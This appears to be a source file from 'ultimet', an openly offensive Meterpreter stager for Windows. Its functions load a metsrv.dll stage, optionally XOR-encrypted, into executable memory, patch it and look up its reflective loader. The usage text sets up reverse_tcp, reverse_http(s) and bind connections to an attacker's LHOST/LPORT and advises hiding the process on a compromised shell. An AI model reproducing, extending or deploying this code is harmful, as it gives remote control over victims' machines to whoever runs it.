#include "main.h"
DWORD err = 0;



LONGLONG SizeFromName(LPCWSTR szFileName) // Returns a file's size from its filename, returns a LONGLONG, in case you have a LARGE LARGE file :)
{
	LARGE_INTEGER fileSize = {0};
	HANDLE hfile = CreateFile(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); //Get a handle on the file

	if (hfile==INVALID_HANDLE_VALUE) //if something went wrong ...
	{
		err = GetLastError();
		dprintf(L"[-] Invalid file handle! CreateFile() returned : %08x\n", err);
		CloseHandle(hfile);
		exit(0);
	}

	if(!GetFileSizeEx(hfile,&fileSize)) // Get the size from the file handle
	{
		err = GetLastError();
		dprintf(L"[-] Error getting file size! GetFileSizeEx() returned : %08x\n", err);
		CloseHandle(hfile);
		exit(0);
	}

	CloseHandle(hfile); // this will ALWAYS throw an exception if run under a debugger, but good higene if run under "production"
	return fileSize.QuadPart; //LARGE_INTEGER is a sruct, QuadPart is the filesize in a 64bit digit... which should cover all file sizes "That's for files >4GB" 
} 

DWORD CopyStageToBuffer(LPCWSTR szFileName, unsigned char** buffer)
{
	// get file size...
	DWORD size = 0;
	size = (DWORD)SizeFromName(szFileName);
	if (size == -1)
	{
		dprintf(L"[-] Something went wrong getting size of file: \"%s\".\n", szFileName);
		exit(0);
	}
	else {
		dprintf(L"[*] Size of \"%s\" is \"%d\" bytes.\n", szFileName, size);
	}

	// Allocate memory ...
	dprintf(L"[*] Trying to VirtualAlloc \"%d\" bytes of data\n", size);
	*buffer = (unsigned char*)VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (buffer == NULL)
	{
		err = GetLastError();
		dprintf(L"[-] Failed to allocate memory! VirtualAlloc() returned : %08x\n", err);
		return -1;
	}
	dprintf(L"[*] Success! \"%d\" bytes allocated.\n", size);

	// Reading file content into buffer.
	//... first we get a handle on the file
	HANDLE hfile = CreateFile(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 
	if (hfile==INVALID_HANDLE_VALUE) //if something went wrong ...
	{
		err = GetLastError();
		dprintf(L"[-] Invalid file handle! CreateFile() returned : %08x\n", err);
		CloseHandle(hfile);
		exit(0);
	}

	dprintf(L"[*] Copying file \"%s\" to buffer...\n", szFileName);
	if( FALSE == ReadFile(hfile, *buffer, (DWORD)size, NULL, NULL) )
	{
		printf("[-] Unable to read from file.\n");
		CloseHandle(hfile);
		exit(0);
	}
	// We add 5 bytes to leave room for 0xBF+SOCKET_NUMBER
	return (DWORD)size; 
}

int PatchString(unsigned char* buffer, const wchar_t* replacement, const int index, const int NoOfBytes)
{
	int counter = 0;
	for(int i = index; i < (index + NoOfBytes); i++)
	{
		buffer[i] = (u_char)replacement[counter];
		counter++;
	}
	return 0;
}

DWORD binstrstr(unsigned char * buff1, int lenbuff1, unsigned char * buff2, int lenbuff2)  // shamelessly ripped from http://forums.devshed.com/c-programming-42/binary-strstr-395935.html , thanks "AlejandroVarela"
{ 
	if (! buff1)                return FALSE; 
	if (! buff2)                return FALSE; 
	if (lenbuff1 == 0)            return FALSE; 
	if (lenbuff2 == 0)            return FALSE; 
	if (lenbuff1 < lenbuff2)            return FALSE; 

	for (int i = 0; i <= (lenbuff1 - lenbuff2); ++ i) 
	{
		if (memcmp(buff1 + i, buff2, lenbuff2-1) == 0)
		{
			return i; 
		}
	}

	return FALSE; 
}  

bool AnsiToUnicode(const char* ascii, wchar_t* unicode)
{
	size_t len = strlen(ascii);
	if(len < 1024)
	{
		int result = MultiByteToWideChar(CP_OEMCP, 0, ascii, -1, unicode, len + 1);
		return TRUE;
	}
	else return FALSE;
}

bool UnicodeToAnsi(char* ascii, const wchar_t* unicode)
{
	int result = WideCharToMultiByte(CP_OEMCP, 0, unicode, -1, ascii, 17, 0, 0);
	//int result = MultiByteToWideChar(CP_OEMCP, 0, ascii, -1, unicode, len + 1);
	return TRUE;
}

void print_header()
{
	printf("\n\n****************************************************\n");
	printf(" [+] [ultimet] - The Ultimate Meterpreter Executable\n");
	printf(" [+] v0.2\n");
	printf("****************************************************\n");
	printf("  -  http://eldeeb.net - @SheriefEldeeb\n\n");
}

void usage()
{
	printf(
		"Usage:\n"
		"utlimet.exe -h <LHOST> -p <LPORT> -t <TRANSPORT> [-f FILENAME] \n"

		"\nMandatory switches:\n"
		"\t-h\tLHOST\tIP or a hostname.\n"
		"\t-p\tLPORT\tPort number.\"\n"
		"\t-t\tTRANSPORT\t\"reverse_tcp\", \"reverse_metsvc\", \"reverse_http\", \"reverse_https\", \"bind_tcp\" or \"bind_metsvc\""

		"\nHTTP(S) Specific parameters:\n"
		"\t-ua\tU_AGENT\t User-Agent, enclose in `\"\"` if contains spaces.\n"
		"\t-et\tSECONDS\t Session expiration timeout in seconds.\n"
		"\t-ct\tSECONDS\t Communication expiration timeout in seconds.\n\n"

		"Stage loading options:\n"
		"\t-f\tFILE\tForces loading the stage from a file.\n"
		"\t\t\tNote: The file can be a regular metsrv.dll,\n"
		"\t\t\tor an encrypted one using the ultimet_xor.exe utility.\n"

		"\n - If you're on a shell [not a console], you have to start the program using:\n"
		"  \"start /b ultimet.exe ...\" or you'll lose your shell.\n"
		"\n - For the reverse_metsvc & bind_metsvc options, stage has to be available\n"
		"   upfront, either through the bundled resource or loaded usng the \"-f\" option\n"
		"\n[+] note that the most reliable handler for reverse_metsvc is:\n\n"
		"  \"windows/metsvc_reverse_tcp\" ... using reverse_metsvc to connect to a \"reverse_tcp\" *might* work,\n"
		"  but not always, so, use reverse_metsvc with windows/metsvc_reverse_tcp... ok?\n"
		"\nand also for bind_metsvc:\n"
		"  \"windows/metsvc_bind_tcp\" ... using bind_metsvc to connect to a \"bind_tcp\" *might* work,\n"
		"  but not always, so, use bind_metsvc with windows/metsvc_metsvc_tcp...\n"
		"\nContributors:\n"
		" - Anwar Mohamed \"@anwarelmakrahy\" - Added support for metsvc_bind_tcp & bind_tcp.\n"

		);
};

DWORD ReflectiveLoaderOffset(DWORD BaseAddress){

	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS pImageHeader;
	PIMAGE_EXPORT_DIRECTORY PExportDirectory;

	DWORD RDLLAddress;

    pDosHeader = (PIMAGE_DOS_HEADER)BaseAddress;
    pImageHeader = (PIMAGE_NT_HEADERS)(BaseAddress + pDosHeader->e_lfanew);

	DWORD ExportRVA = pImageHeader->OptionalHeader.DataDirectory[0].VirtualAddress;
	PExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(RVAToOffset(pImageHeader,ExportRVA)+BaseAddress);

	PDWORD ExportFunctions = (PDWORD)(RVAToOffset(pImageHeader, PExportDirectory->AddressOfFunctions) + BaseAddress); 
	PDWORD ExportNames = (PDWORD)(RVAToOffset(pImageHeader, PExportDirectory->AddressOfNames) + BaseAddress);
	PWORD ExportOrdinals = (PWORD)(RVAToOffset(pImageHeader, PExportDirectory->AddressOfNameOrdinals) + BaseAddress);

	for (DWORD i =0; i<PExportDirectory->NumberOfFunctions; i++) {
		std::cout << (char*)(DWORD*)RVAToOffset(pImageHeader,ExportNames[i]) + BaseAddress << std::endl;

            std::cout << (PDWORD)RVAToOffset(pImageHeader,ExportFunctions[ExportOrdinals[i]]) + BaseAddress << std::endl;
    }
	return false;
};


DWORD RVAToOffset(IMAGE_NT_HEADERS32 * pNtHdr, DWORD dwRVA)
{
	int i;
    WORD wSections;
    PIMAGE_SECTION_HEADER pSectionHdr;
    pSectionHdr = IMAGE_FIRST_SECTION(pNtHdr);
    wSections = pNtHdr->FileHeader.NumberOfSections;
    for (i = 0; i < wSections; i++)
    {
		if (pSectionHdr->VirtualAddress <= dwRVA)
			if ((pSectionHdr->VirtualAddress + pSectionHdr->Misc.VirtualSize) > dwRVA)
            {
                dwRVA -= pSectionHdr->VirtualAddress;
                dwRVA += pSectionHdr->PointerToRawData;
				return (dwRVA);
            }
        pSectionHdr++;
    }
    return 0;
}
